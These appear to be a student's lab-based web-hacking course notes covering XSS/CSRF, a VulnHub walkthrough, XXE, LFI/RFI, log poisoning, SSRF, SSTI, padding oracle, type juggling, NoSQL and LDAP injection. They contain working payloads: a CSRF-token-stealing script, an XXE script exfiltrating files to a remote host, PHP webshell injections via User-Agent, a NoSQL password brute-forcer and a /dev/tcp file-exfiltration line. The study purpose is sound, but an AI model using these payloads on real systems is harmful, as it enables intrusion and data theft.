As we see, there is a POST request to **/newgossip** the cookie as seen we can steal it easily, now we see that we need a **csrf_token** field, let's see if the token is being generated dinamically.

Using the view source (ctrl+shift+u) we found the value is hardcoded.

![[Untitled 61.png]]

So, we have everything we need, lets create a script.

```JavaScript
var domain = "http://localhost:10007/newgossip";

var req1 = new  XMLHttpRequest();
req1.open('GET', domain, false); //This false indicated that the request is synchronous
req1.withCredentials = true; //Arrastrar session
req1.send();

var response = req1.responseText;
/*ES TO ES A MODO DE TRAZA PARA PODER VER EL HTML D ELA RESPUESTA, DE ACA SE PARSEA EL CAMPO CON EL CSRF_TOKEN*/
//var req2 = new XMLHttpRequest();
//req2.open('GET','http://<remote_server_ip>/?response=' + btoa(response)); //btoa encodes to b64

var parser = new DOMParser();
var doc = parser.parseFromString(response,'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;

var req2 = new XMLHttpRequest();
var data = 'title=prueba&subtitle=prueba&_csrf_token=' + token;
req2.open('POST', domain , false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);
```

![[Untitled 62.png]]

---

### Exploiting Vulnhub machine MyExpense

Now, let’s get started with the first machine.

The machine is called [MyExpense from Vulnhub](https://vulnhub.com/entry/myexpense-1,405).

  

I download the machine and import it to VMWare, but first I need to configure something to make it work, since the machine is meant to be used in VirtualBox.

- Previous Configuration
    
    First of all change the network configuration, since it probably be configured as NAT or Host-Only.
    
    ![[Untitled 63.png]]
    
    Then once we initiate the machine, press E on the GRUB, and a configuration file will come up.
    
    ![[Untitled 64.png]]
    
    The highlighted line has to change from “ro” to “rw init=/bin/bash”. This will give us a priviliged bash as the user root, since this instruction is executed by root user.
    
    ![[Untitled 65.png]]
    
    Now the interface of the machine has to be reconfigured.
    
    ![[Untitled 66.png]]
    
    In this file we need to change a value “enp0s3” to “ens33”.
    
    ![[Untitled 67.png]]
    
    Restart the machine and check if it is up.
    
    ![[Untitled 68.png]]
    
    As seen, there a new VMware machine with IP .42, since my machine is the .36, I can assume that is in fact the new machine.
    
    ---
    
    Now since we configured the interface, we also need to change this in the scripts running in the machine to be hacked.
    
    ![[Untitled 69.png]]
    
    This scripts make the machine run and be exploitable, so we need them running.
    
    ![[Untitled 70.png]]
    
    As seen, it is dinamically getting the IP address of the machine with previous interface, now we changed it, so we need to change the interface or hardcode the IP of the machine in every script.
    
      
    

---

Resolution

- Recon
    
    I start with the recon of the machine.
    
    ![[Untitled 71.png]]
    
    Five ports were found, now Ill try retrieve information about the services.
    
    This is what I found, something that caugth my attention is that there is an admin panel, and the session cookie does not have the HTTPOnly flag.
    
    ![[Untitled 72.png]]
    
    ![[Untitled 73.png]]
    
    I will use Gobuster to fuzz directories to see if there are more to this admin panel.
    
    ![[Untitled 74.png]]
    
    ![[Untitled 75.png]]
    
    In this case we have more directories, and confirmed the admin directorie, lets go deep in the URL.
    
    Knowing that the page is written in PHP, we can look up for .php pages under the admin path.
    
    ![[Untitled 76.png]]
    
      
    
- Exploit
    
    I noticed a sign-up page, where the button is disabled only from the HTML code.
    
    I try to enable it and create an account.
    
    ![[Untitled 77.png]]
    
    And it worked, the account was created.
    
    ![[Untitled 78.png]]
    
    Also the it seems that it is vulnerable to XSS.
    
    ![[Untitled 79.png]]
    
    What Ill do is to create another user with a remote script.
    
    ![[Untitled 80.png]]
    
    Now in this script I can do whatever I want.
    
    And I am getting the requests.
    
    ![[Untitled 81.png]]
    
    So in this case I have stolen the session cookie.
    
    ![[Untitled 82.png]]
    
    Now I will try to hijack the session with the cookie.
    
    ![[Untitled 83.png]]
    
    But this is not possible, since is an admin account and only one session can be at a time.
    
    So, what I could do is that the admin actives my account using the URL.
    
    ![[Untitled 84.png]]
    
    And, that worked well :)
    
    ![[Untitled 85.png]]
    
    ![[Untitled 86.png]]
    
    Using the old credential I was able to enter the portal.
    
    ![[Untitled 87.png]]
    
    And as seen, the input I found is not sanitized.
    
    Let’s see if I can grab some more cookies.
    
    ![[Untitled 88.png]]
    
    So, I found 3 more cookies, now I'll use one by one.
    
    The first cookie is from a manager, so as a manager I validated my Expense report.
    
    ![[Untitled 89.png]]
    
    Now I need the next step, someone has to accept the Expense, I need the cookie of a Financial Approver.
    
    In this case, the manager of Manon Riviere, which is Paul Baudouin, is a financial approver.
    
      
    
    Now, the other cookies that I found are from the other collaborators, so they are Un useful.
    
    What caught my attention was the query param in the URL from Rennes page.
    
    ![[Untitled 90.png]]
    
    So, yes it is vulnerable, but in this case, the ID is passed as a number, so I do not have to use quotation mark (’).
    
    ![[Untitled 91.png]]
    
    Now, I begin the SQLi Exploitation. REFER TO [[Introduction to Hacking]]
    
    ![[Untitled 92.png]]
    
    I listed all the DBs.
    
    ![[Untitled 93.png]]
    
    Let’s try the users, and its passwords.
    
    ![[Untitled 94.png]]
    
    From the table user Ill list everything.
    
    ![[Untitled 95.png]]
    
    ![[Untitled 96.png]]
    
    ![[Untitled 97.png]]
    
    Finally, I got a Dump of credentials from the DB.
    
    ![[Untitled 98.png]]
    
    ![[Untitled 99.png]]
    
    FLAG → flag{H4CKY0URL1F3}
    
    ![[Untitled 100.png]]
    

## XML External Entity (XXE)

When we talk about XXE Injection we are referring to a security vulnerability that an attacker can use a malicious XML Input to access the system resources that normally are not available, like, local files or network services.  
This vulnerability can be exploited in applications that use XML to process entries, like web-applications or web-services.  

  

A XXE attack generally implies the injection of an XML malicious entity in a HTTP request, this is processed by the server and can result in the exposition of sensitive information.

For example, the attacker could inject an XML that refers to a file in the server’s system and obtain sensitive information about this file.

  

A common case where this can be exploited is when the server does not validate correctly an XML input that it’s recibied. In this case, the attacker can inject an XML malious entity that contains references to a system file in the server. This can allow the attacker to obtain sensitive information, like, passwords, usernames, API Keys among others confidential data.

  

Additionally, some cases of XXE can derive into a SSRF exploit. This technique could allow an attacker to scan internal ports in a machine with an external firewall.

An SSRF attack implies to send HTTP request form the server to the internal network of the victim. XXE can unchain an SSRF by injecting an XML entity that contains a reference to an internal IP or PORT inside the server’s network.

---

- What is XML?
    
    ![[Untitled 101.png]]
    
    ![[Untitled 102.png]]
    
    ![[Untitled 103.png]]
    
    ![[Untitled 104.png]]
    
    ![[Untitled 105.png]]
    

---

• **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)

---

This is the login page of the app.

![[Untitled 106.png]]

Now, using Burp, we intercept the request.

![[Untitled 107.png]]

It is using XML, and it is also vulnerable to XXE.

![[Untitled 108.png]]

As seen, there is information being outputted, but there's is also sometimes where the information is not represented in the response.

Here when there no response, is where the XXEOOB (XXE OutOfBand Interaction) and the Externals DTD (XDTD) enter the game.

![[Untitled 109.png]]

![[Untitled 110.png]]

---

So, sometimes is not possible to inject entities, so we can use a HTTP server to inject.

![[Untitled 111.png]]

This wouldn't work if you cannot inject entities, since we would not be able to call the DTD.

So, we can “auto invoke” the DTD.

![[Untitled 112.png]]

So, if we check the server.

![[Untitled 113.png]]

So, this is the way to include an external DTD when we cannot call or create a new entity.

![[Untitled 114.png]]

![[Untitled 115.png]]

```Bash
#!/bin/bash

echo -ne "\n [+] Introduce el archivo a leer: " && read -r myFilename

malicious_dtd=""" 
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &\#X25; exfil SYSTEM 'http://<remote_server_ip>/?file=%file;'>\">
%eval;
%exfil;"""

\#echo; echo $malicious_dtd
echo $malicious_dtd > malicious.dtd

python3 -m http.server <port> &>response &

PID=$!

sleep 1; echo

curl -s X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding=UTF-8?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<ip_remote_server>/malicious.dtd"> %xxe;]>
<root><name>test</name><email>test@test.com</email><password>test123</password></root>' &>/dev/null

cat response | grep -oP "/?file=\K[^.*\s]+" | base -d
kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null
```

  

## Local File Inclusion (LFI)

Local File Inclusion is a vulnerability that occurs when a web-application does not validate properly the user inputs, allowing the attacker to access local files within the webserver.

  

In many cases, the attacker makes use of LFI abusing the inputs of the application. The parameters can be URLs or form fields. These are manipulated to include path to local files in the request. This technique is known as “**path traversal**” and it is often used with LFI.

  

In **path travesal** the attacker may use special or escape characters within the inputs.

  

To prevent this LFI attacks, it is important that the developers validate and filter adequately all the inputs.

  

Here is a tool that we will be using to abuse ‘**Filter Chains**’ and gain RCE.

• **PHP Filter Chain Generator**: [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

---

- Demo
    
    For the pourpouse of demonstration, we will be creating a simple php HTTP server.
    
    ![[Untitled 116.png]]
    
    This gets the query parameter filename, and stores whatever comes into the $filename variable to then be included.
    
    ![[Untitled 117.png]]
    
    Now, this is not sanitized, so we are trusting the user’s input. And that is a bad idea.
    
    ![[Untitled 118.png]]
    
    There are versions of php which are vulnerable to NULL byte
    
    ![[Untitled 119.png]]
    
    ![[Untitled 120.png]]
    
- Wrappers
    
    The wrappers can be used to see the code of an page.
    
    This wrapper converts teh code to an encode b64 chain
    
    `php://filter/convert.base64-encode/resource=index.php`
    
    We also have the rot13
    
    `php://filter/read=string.rot13/resource=index.php`
    
    ![[Untitled 121.png]]
    
    Now the next one is more spicy. We know that trough LFI we can achieve an RCE, so this wrapper **iconv** allows us to do this.
    
    `php://filter/convert.iconv.utf-8.utf-16/resource=index.php`
    
      
    
    We can use this next wrapper by intercepting a request with Burpsuite abd changing the method to POST.
    
    `POST /?filename=php://input`  
      
    `<?php system(”whoami”); ?>`
    
    ![[Untitled 122.png]]
    
    `GET/?filename=data://text/plain;base64,<b64_chain>`
    
    ![[Untitled 123.png]]
    
    ![[Untitled 124.png]]
    
    As seen with this filter chains, w can change our b64 chain to add different characters, this allows us to create a payload.
    
    ![[Untitled 125.png]]
    
    ![[Untitled 126.png]]
    

## Remote File Inclusion (RFI)

Remote File Inclusion (RFI) vulnerability it’s a security flaw that an attacker can use to include remote files in a vulnerable web app. This may allow the attacker to execute malicious code in the server and compromise the system.

In a RFI attack, the actor uses an user input, like, a URL or a from field to include the remote file.

This remote files can include malicious code, virus/trojans, or execute commands in the vulnerabler server. Sometimes it is posible to redirect the request to a PHP resource hosted in a owned server to give a higher control over the attack.

  

Resources used in this lesson.

• **DVWP**: [https://github.com/vavkamil/dvwp](https://github.com/vavkamil/dvwp)

• **Gwolle Guestbook**: [https://es.wordpress.org/plugins/gwolle-gb/](https://es.wordpress.org/plugins/gwolle-gb/)

---

In this exercise DVWP was installed with an plugin called Gwolle but in a previous version, this version is vulnerable to RFI.

![[Untitled 127.png]]

![[Untitled 128.png]]

  

Now we can start the discovery with WFUZZ, to find this plugin.

`wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/CMS http://localhost:31337/FUZZ`

  

![[Untitled 129.png]]

Using SEARCHSPLOIT we can find vulns to this plugins, but in this case we dont know the version.

![[Untitled 130.png]]

Using `searchsploit -x <path_to_exploit>` we can see the code of the exploit.

To test this we have to set **allow_url_include = “on”** in the **php.ini** config file.

![[Untitled 131.png]]

![[Untitled 132.png]]

![[Untitled 133.png]]

![[Untitled 134.png]]

## Log Poisoning (LFI → RCE)

This is a technique where the attacker manipulates the logs from a web app to achieve a malicious result. This technique can be used with LFI to achieve an RCE in the server.

  

For a PoC in this lesson will be going to poison the resources ‘auth.log’ of th SSH and ‘access.log’ of Apache applications. Once we gain access to this files we are going to see how to manipulate the files to poison these.

  

In the case of the SSH, the attacker may inject PHP code in the user field during the authtentication proccess. This would allow the code to get registered in the ‘auth.log’ of SSH and then, be interpreted when this file is read. Using this technique the attacker may make use of an RCE.

  

In the ‘access.log’ case of Apache, the attacker may inject PHP code in the User-Agente filed of a HTTP request. This malicious code gets registered in the file and then executed when the file is read.

  

It is worth to mention that in some systems, the ‘auth.log’ is not in use to register the events of authentication. In its place, the events may be handled by other log file with different names.

For example in Debian and Ubuntu based systems , the SSH events, are registered in the ‘auth.log’. However, in RedHat and CentOS based systems, the events, are registered in the ‘bmtp’ file.

  

To prevent Log Poisoning, the developers should limit the access to this file and make sure that are securely stored. In addition, it is important to validate the inputs and sanitize them.

---

If the logs are accesible by the user that helds the daemon of the http server (by default www-data) we can see the logs as a LFI

![[Untitled 135.png]]

As seen, the User-Agent header is represented among the logs.

So what happens if we inject PHP code?

`curl -s -X GET "http://localhost/probando" -H “User-Agent: <? php system(’whoami’); ?>”`

![[Untitled 136.png]]

  

`curl -s -X GET "http://localhost/probando" -H "User-Agent: <? php system(\$_GET['cmd']); ?>"`

  

  

## Cross Site Request Forgery (CSRF)

CSRF is a vulnerability in which the attacker fools an legitimate user to realize an undesired action in the web site without his knowledge nor consent.

  

In a CSRF attack, the actor may trick the victim to click in a malicious URL or visit a malicious web page. This malicious web page may contain an HTTP request that makes an undesired action in the victims web page.

  

For example, imagine that an user has logged in to the bank aplication an then visits a malicious web page. This malicious website contains a form that sents an HTTP request to the bank server to retrieve funds form the user’s account. If the user clicks in the button without having knowledge the CSRF would be succesfull.

  

This attack can be used in many different ways to do a variety of undesired actions, including the fund transfer, modifying the account, data elimination, etc.

  

To prevent this attack, the developers have to implement security measures, like, CSRF tokens in the forms and HTTP requests. This CSRF tokens allows the web application to verify if the request is coming from a legitimate user and not from a malicious attacker.

  

---

Here is the lab to practice this CSRF lesson.

• **Lab Setup**: [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)

---

- PoC LAB
    
    We start for setting up the lab, in this case is all automated by docker-compose
    
    ![[Untitled 137.png]]
    
    Once is up, we can see the containers
    
    ![[Untitled 138.png]]
    
    And we need to add this hosts to the /etc/hosts file
    
    ![[Untitled 139.png]]
    
    ---
    
    Once all set up
    
    ![[Untitled 140.png]]
    
    In this case we the PoC is only focused in the CSRF, so we already have creds and everything.
    
    ![[Untitled 141.png]]
    
    ---
    
    So in this website, we log in as Alice, once in, there is a profile and we can edit this profile.
    
    ![[Untitled 142.png]]
    
    We capture this request to see how is being handled
    
    ![[Untitled 143.png]]
    
    This request is handled as POST request, we can see all the data, and some “elgg_tokens” this makes me think this is an identifier for each user, but we also have a “guid = 56” for this user.
    
    So to test if this is indeed well developed, lets test changing the method
    
    ![[Untitled 144.png]]
    
    This leaves us with the URL and all the query parameters
    
    ![[Untitled 145.png]]
    
    And to further test this lets remove these elgg tokens
    
    ![[Untitled 146.png]]
    
    We sent the request, and it did passed and interpreted
    
    ![[Untitled 147.png]]
    
    So as first sigth it works using GET
    
    Now, we do not exploited a CSRF yet, but this opens a vector to try.
    
    So let’s imagine we want to change the name of another user usng its **guid**.
    
    ![[Untitled 148.png]]
    
    So this does not works
    
    ![[Untitled 149.png]]
    
    So what we can try is sending this URL to the user
    
    ![[Untitled 150.png]]
    
    So when Alice, recived this messaege
    
    ![[Untitled 151.png]]
    
    ![[Untitled 152.png]]
    
      
    

## Server-Side Request Forgery (SSRF)

The SSRF is a vulnerability in which the attacker can force the web server to make HTTP request in his name.

In a SSRF attack the actor uses an uer input, such as URLs, form input, etc. To send a HTTP request to a web server. The attacker manipulates the request to be directed to a vulnerable server or a internal network that the server has access.

The SSRF attack may allow the attacker to access confidential information such as passwords, API keys and other sensitive data, and may also allow the attacker (depending on the scenario) to execute commands on the web server or on other servers in the internal network.

  

One of the differences between CSRF and SSRF is taht SSRF is executed in the web server and not in the user’s browser. In this case there is no need to trick the legitmate user to click on something malicious, since the HTTP request is sent from an external source.

  

To prevent SSRF attacks, it is important that web application developers properly validate and filter user input and limit web server access to internal network resources. In addition, web servers should be configured to limit access to sensitive resources and restrict access by unauthorized users.

---

In this lesson we will be creating personalized networks to imitate an internal network that we compromise. We will try to look for an internally hosted resource that is not available from the outside.

  

To create a new network in Docker, we use:

➜ `docker network create --subnet=<subnet> <nombre_de_red>`  
Where:  

> **subnet**: Is the IP of the subnet that we are creating. It is important that this IP is unique and is not in conflict with other networks or sub-networks in our system.  
>   
> **nombre_de_la_red:** Is the name of the network that we are creating.

In addition to this fields we will be using, **-driver** in the command to specify the network adapter to use.

➜ `docker network create --subnet=<subnet> --driver=bridge <nombre_de_red>`

In this case, we are using the '-driver=bridge' option to indicate that we want to create a bridge network. The -driver option allows us to specify the network driver we want to use, which can be "bridge", "overlay", "macvlan", "ipvlan" or another driver supported by Docker.

---

- PoC LAB
    - Setting up
        
        We’ll use latest ubuntu image.
        
        ![[Untitled 153.png]]
        
        In this case we are not going to use port forwarding, and we’ll be using the container IP.
        
        ![[Untitled 154.png]]
        
        Then we need to update as
        
        `apt update`
        
        `apt install -y apache2 php nano python3 lsof`
        
          
        
        ![[Untitled 155.png]]
        
        We need to allow URL include in the php.ini config file.
        
        ![[Untitled 156.png]]
        
        Now we are serving another HTTP server binded to [localhost](http://localhost) inside the container.
        
        ![[Untitled 157.png]]
        
          
        
    - First lab
        
        ![[Untitled 158.png]]
        
        Now for the first scenario we have a server with the HTTP port 80 exposed, but with an utility that lets you include URLs.
        
        ![[Untitled 159.png]]
        
        With this utility we could FUZZ all the ports for the localhost.
        
        `wfuzz -c -t 200 -z range,1-65535 "http//<container_IP>/utility.php?url=http://127.0.0.1:FUZZ"`
        
        Now this scan has the same response for all the ports so it may be good to filter this.
        
        ![[Untitled 160.png]]
        
        `wfuzz -c -t 200 --hl=3 -z range,1-65535 "http//<container_IP>/utility.php?url=http://127.0.0.1:FUZZ"`
        
        ![[Untitled 161.png]]
        
        As seen, there were found two ports.
        
          
        
    - Second lab
        
        - setting up
            
            Now we need another subnet for this, so let's create it.
            
            `docker network create --driver=bridge network1 --subnet=10.10.0.0/24`
            
            ![[Untitled 162.png]]
            
            So, we going to need three containers. Prod, testing, and attacker’s machine.
            
            `docker run -dit PRO ubuntu`
            
            With the following we will connect the PROduction machine to the other network interface.
            
            `docker network connect network1 PRO`
            
            ![[Untitled 163.png]]
            
            Now for the other machine, we will deploy this one working in the class A subnet.
            
            `docker run -dit --name PRE --network=network1 ubuntu`
            
              
            
        
        ![[Untitled 164.png]]
        
        In this case, we can see a similar scenario, but with the slight difference that the server has two network interfaces. Now we know that the interface **docker0** in our machine is in the same subnet that the server (172.17.0.0/24), but the other IP belongs to another subnet (10.10.0.0/24).
        
        ![[Untitled 165.png]]
        
          
        

## Server-Side Template Injection (SSTI)

The SSTI is a vulnerability in which the attacker can inject malicious code into the webpage template.

The templates are files that contain code used to generate **dynamic content** in the web page. The attackers can use this vulnerability to inject code in the server’s template, which let's execute code and obtain unauthorized access to the app as well to another content in the server.

  

For example, a server uses templates to generate personalized e-mails. An attacker could make use of this vulnerability to inject the code into the E-mails template, deriving in executing code.

  

In a practical case, the attackers could detect if an application is making use of Flask using tool like WhatWeb. If Flask is detected the attacker could exploit this vulnerability since Flask uses Jinja2 as template engine. Django, Ruby on Rails, are other that could be vulnerable.

---

- PoC Lab
    
    `docker run -p8089:8089 -d filipkarc/ssti-flask-hacking-playground`
    
    ![[Untitled 166.png]]
    
    This is the main page of the vulnerable application.
    
    ![[Untitled 167.png]]
    
    Every time we see that the web page is using flask or python, we should try if it is vulnerable. One of the ways is this one
    
    ![[Untitled 168.png]]
    
    ![[Untitled 169.png]]
    
    As seen, it is interpreting the code.
    
    ![[Untitled 170.png]]
    
      
    

## Client-Side Template Injection (CSTI)

CSTI is a vulnerability on which the attacker can inject code in the client’s template, which is executed in the user’s browser.

This could allow the malicious actor to inject code in the user’s browser allowing to execute commands and obtain unauthorized access.

Typically, CSTI has to be derived to a XSS or RCE.

[SKFLABS](https://github.com/blabla1337/skf-labs)

---

- PoC Lab
    
    ![[Untitled 171.png]]
    
    ![[Untitled 172.png]]
    
      
    

## Padding Oracle Attack

A Padding Oracle Attack is a type of attack that is focused in cyphered data, this allows the attacker to de-cypher the content without knowing the key.

  

An oracle makes reference to an “indication” that lets the attacker to see if what he is doing is right or no. Imagine that you are playing a table game: the face of your opponent brightens up when he knows that he has a good hand. That is an oracle, in this case, as opponent, we can use this oracle to plan our next move.

The padding is a specific cryptographic term. Some cyphers, which are the algorithms that are used to cypher data, work in blocks of data in which every block has a fixed data length. If the data that you wish to cypher is larger than the adequate length, the data is filled automatically until they fit. Many ways of padding require this, even if the length was appropriate. This allows the padding to always be stripped out safely after the cypher.

Combining these two elements, a padding oracle software implementation reveals if the cyphered data is valid. The oracle could be something as simple as returning a value that says, “Invalid Padding”, or something more complex, but this will take longer to process a valid block instead of a non-valid block.

![[Untitled 173.png]]

The block-based cyphers have another property denominated “mode”, this property determines the relation of the data in the first block with the data in the second block, successively. One of the most used modes is **CBC.** CBC presents a random initial block, known as “Initialization Vector” (IV) and combines the previous block with the result of the static cypher with the goal that every message with the same key does not generates the same output.

  

An attacker can use a padding oracle in combination with the way CBC structures the data, to send slightly modified messages to the code that exposes the oracle until the oracle says it is correct. With this answer the attacker could de-cypher the message byte by byte.

  

The quality in the networks is so high that an attacker could detect small differences (less than 0,1ms) in execution time. The applications that assume that a correct de-cypher only can happen when the data is not altered could be vulnerable to attacks with use of tools that are designed to observe these differences between a correct or incorrect cypher.

  

This type of attack is based on the ability of changing cyphered data y test the result with the oracle. The only way to mitigate this attack is to detect the changes in the cyphered data and reject modified data. The standard way to do this is to create a signature for the data and validate it before making any operation. The signature should be verifiable, and the attacker should not be able to create it, since in this case, the attacker could modify the data and calculate another signature for this modified data.

  

A common type of signature is known as “Hash-Based Message Authentication Code” (HMAC). An HMAC differs by having another layer of verification that requires a private key, which is only known by the person that generate the HMAC and who validates it. If the key is not available, the HMAC cannot be generated. When the data is recieved you can take this data and calculate the HMAC with the private key shared by the emmiter to then compare the HMAC with one sent by the emmiter. This comparision has to be a constant time or you will have introduced another oracle and another type of attack.

  

In summary, to securely use padded CBC block ciphers, it is necessary to combine them with an HMAC (or other data integrity check) that is validated by a constant time comparison before attempting to decrypt the data. Since all modified messages take the same time to generate a response, the attack is prevented.

  

The padding oracle attack can seem a little complex at first glance, since implies a feedback proccess to guess the ciphered content and modify the padding. However, there are tools like **PadBuster** that can automate a big part of this proccess.

  

PadBuster is a tool designed to automate the decryption process of CBC-mode encrypted messages using PKCS \#7 padding. The tool allows attackers to send HTTP requests with malicious padding to determine whether the padding is valid or not. In this way, attackers can guess the encrypted content and decrypt the entire message.

---

The direct download link to Vulnhub's 'Padding Oracle' machine, which we will be importing into VMWare to practice this vulnerability, is provided below:

• **Pentester Lab** **– Padding Oracle**: [https://www.vulnhub.com/?q=padding+oracle](https://www.vulnhub.com/?q=padding+oracle)

---

- PoC lab
    
    Now we start with a recon
    
    ![[Untitled 174.png]]
    
    Using NMAP
    
    ![[Untitled 175.png]]
    
    We see an HTTP service
    
    ![[Untitled 176.png]]
    
    Now, where does this padding attack makes sense? Well the applications use cookies, this cookies are ciphered but their have cleartext behind
    
    ![[Untitled 177.png]]
    
    This clear text could have the user hardcoded in which case we could change it to ‘admin’ for example
    
    Lets take a look to the tool we will be using
    
    ![[Untitled 178.png]]
    
    The default usage is
    
    `padbuster http://<machine_ip>/index.php <cookie_sample> 8 -cookies 'auth=<cookie_sample>'`
    
    ![[Untitled 179.png]]
    
    ![[Untitled 180.png]]
    
    Now we have the cookie de-ciphered, and we see that indeed the plaintext was **‘user=s4vitar’**
    
    With this in mind, we can now cipher data to create a new cookie
    
    `padbuster http://<machine_ip>/index.php <cookie_sample> 8 -cookies 'auth=<cookie_sample>' -plaintext ’user=admin’`
    
    ![[Untitled 181.png]]
    
    ![[Untitled 182.png]]
    
    And we have a new cookie for the user admin, lets test if this works
    
    ![[Untitled 183.png]]
    
    Changed the cookie in the browser, and reloaded..
    
    ![[Untitled 184.png]]
    
    And just like that we have the session hijacked of the user admin.
    
      
    

## Type Juggling Attack

A Type juggling attack is a technique used in programming to manipulate the type of data of a variable, this with objective of fooling the program and do something it should’nt

The mayority of programming languages use types of data to classify the information that is stored in a variable, like integers, float, strings, boolean, etc.  
The programs use this types to make operations, comparisons and other specific tasks. However, the attackers may exploit vulnerabilities in programs that do not validate correctly the type of data that is sent.  

  

in a type juggling attack, the attacker manipulates the input to change the type of the variable. For example, the attacker may provide a string of characters that “may look” like an integer number, but in reality it is not. If the program does not validates this properly it may try and make some operation with that data and return unexpected values.

A common example is how a type juggling attack could be use to evade the authentication of a system that uses string comparisons to verify passwords.

  

For example, in PHP, a string that begins with a number, is converted automatically into a number if it is used in a number comparision. Therefore, if the attacker gives an string that start with a cero (0) like “00123”, the program will convert this into the integer number of 123.

![[Untitled 185.png]]

If the password in the system is stored as a integer (instead of a string), the comparison with the attacker’s password and the one stored may be succesfull, which will allow the attacker to evade the authentication.

---

- PoC 1
    
    ![[Untitled 186.png]]
    
    For the first test, we will intercept the request with Burpsuite
    
    ![[Untitled 187.png]]
    
    As we can see, the request uses POST method, and the type of the credentials is string
    
      
    
    Now lets change the type and see what happens.
    
    ![[Untitled 188.png]]
    
    And with this change we have access.
    
- PoC 2
    
    ![[Untitled 189.png]]
    
    In this case the password is stored as a md5 hash and the given password is computed as a md5 hash and then compared.
    
      
    
    This opens a vulnerability since some “magic hashes” appears here. This magic hashes are the ones that start with 0eXXXXXXXX… PHP treats this as an exponential, and we know that zero exponetial to anythin is zero, so when we compare 0==0 this is true
    
    ![[Untitled 190.png]]
    
    As we can see, using either of this passwords, the program will compare zeros and for one user you have (in this example) three passwords, pretty cool huh
    

## NoSQL Injections (NoSQLi)

NoSQLi are security vulnerabilities in the web application that use NoSQL databases, like, MongoDB, Cassandra and CouchDB, among others. This injections are produced when an applciation lets the user to sent malicious data through a database query, which later is executed because of the lack of sanitization or validation.

The NoSQLi works similar to SQLi, but this are focused in NoSQLi DBs. The attacker takes advantage of of the querys that relies in documents instead of relational databases to sent malicious data that may manipulate the query and obtain confidential information.

Unlike SQL injections, NoSQL injections exploit the lack of data validation in a NoSQL database query, rather than exploiting the weaknesses of SQL queries in relational databases.

---

• **Vulnerable-Node-App**: [https://github.com/Charlie-belmer/vulnerable-node-app](https://github.com/Charlie-belmer/vulnerable-node-app)

---

- PoC Lab
    
    ![[Untitled 191.png]]
    
    `docker-compose up -d`
    
    ![[Untitled 192.png]]
    
    This is how the data flows via requests
    
    Using regex we have
    
    ![[Untitled 193.png]]
    
      
    
    ```Python
    #!/usr/bin/python3
    
    from pwn import *
    import requests, time, sys, signal, string
    
    \#CTRL+C
    def def_handler(sig, frame):
    	print("\n\np[!]Saliendo...\n")
    	sys.exit(1)
    
    \#Variables Globales
    login_url: = "http://localhost:4000/user/login"
    characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
    
    def makeNoSQLi():
    
    	password = ""
    	
    	p1 = log.progress("Fuerza bruta")
    	p1.status("Iniciando procesos de fuerza bruta")
    
    	time.sleep(2)
    
    	p2 = log.progress("Password")
    
    	for position in range(0, 24):
    		for character in characters:
    			
    			post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password,character)
    			
    			headers = {'Content-Type': 'application/json'}
    			
    			r = requests.post(login_url, headers=headers, data=post_data)
    
    			if "Logged in as user" in r.text:
    				
    				password += character
    				p2.status(password)
    				break
    
    if __name__ == '__main__':
    
    	makeNoSQLi()
    ```
    
    ![[Untitled 194.png]]
    
    [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
    

## LDAP Injections

The LDAP Injections are a type of attack in which the vulnerabilities of the web application that interacts with a LDAP server are exploited. LDAP server is a directory that is used to store user’s information and network resources.

The injection works via inserting LDAP commands in the inputs of the web application, that then are sent to the LDAP server.

  

As well as SQL and NoSQL injections, LDAP injection can be dangerous, here are some examples of what can be achived:

- Access to information or resources that should not be accessible.
- Make unauthorized changes in the database of the LDAP server, adding or deleting user or resources.
- Make malicious operations over the network as sent phishing or install malware in the systems.

  

To prevent LDAP injections, web applications that interact with an LDAP server must properly validate and clean up user input before sending it to the LDAP server. This includes validating the syntax of input fields, removing special characters, and limiting the commands that can be executed on the LDAP server.

It is also important that web applications are run with minimum privileges on the network and that LDAP server activities are regularly monitored for possible injections.

---

Next, this is the link to the GitHub project in which this lesson is based:

• **LDAP-Injection-Vuln-App**: [https://github.com/motikan2010/LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App)

- NOTE
    
    ![[Untitled 195.png]]
    

---

- PoC LAB
    
    - Installation
        
        ![[Untitled 196.png]]
        
        ![[Untitled 197.png]]
        
        ![[Untitled 198.png]]
        
          
        
    
    ---
    
    3 users were created for this PoC (s4vitar, omar, txhaka)
    
    ![[Untitled 199.png]]
    
    ![[Untitled 200.png]]
    
    ---
    
    The lab is simple, it will log us when we give the correct credentials
    
    ![[Untitled 201.png]]
    
      
    
    Using ldapsearch we can see the info of the service
    
    ![[Untitled 202.png]]
    
    This can also be done with the scripts of nmap
    
    `locate .nse`
    
    This final `'cn=admin'` is our search critheria, and this we can use to search for more things.
    
    ![[Untitled 203.png]]
    
    In this case we are using the description field of the user **admin**
    
      
    
    > To use BAT in our attacker machine to display better a file  
    >   
    > att> nc -nvlp 443 | cat -l php  
    >   
    > victim> cat < <file> > /dev/tcp/<att_machine_ip>/<port>  
    >   
    
    So, the sintax of LDAP allow us to make something like NoSQLi if not sanitized
    
    ![[Untitled 204.png]]
    
    ![[Untitled 205.png]]
    
    And making use of null bytes we can exit from the query **admin))%00**
    
    ![[Untitled 206.png]]
    
    This opens a pottential way to enumerate attributes like this
    
    ![[Untitled 207.png]]
    
    We can FUZZ using the SecLists dictionary /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt
    
    So, using wfuzz
    
